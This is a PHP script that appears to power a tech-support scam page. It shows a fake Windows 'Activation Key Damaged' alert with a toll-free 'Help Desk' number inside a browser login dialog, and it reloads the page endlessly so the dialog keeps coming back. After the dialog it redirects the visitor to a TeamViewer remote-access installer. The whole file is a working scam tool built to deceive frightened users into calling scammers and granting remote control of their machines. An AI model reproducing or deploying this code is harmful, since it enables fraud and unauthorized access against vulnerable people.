<?php

    session_start();

    $_user = 'windows2016';
    $_password = 'microsoft';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 3;}

        if($_SESSION['login_attempts'] == 3){
            header('Location: report.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="0x80070424 Warning: Activation Key Damaged !!! Call Help Desk: 1-888-617-4125(TOLL-FREE) "');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title>Internet Security Damaged !!! Call Help Desk</title></head><body>";


            exit;
        }
    } else {

        header('Location: report.php');
        header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');

        exit;
    }
?>
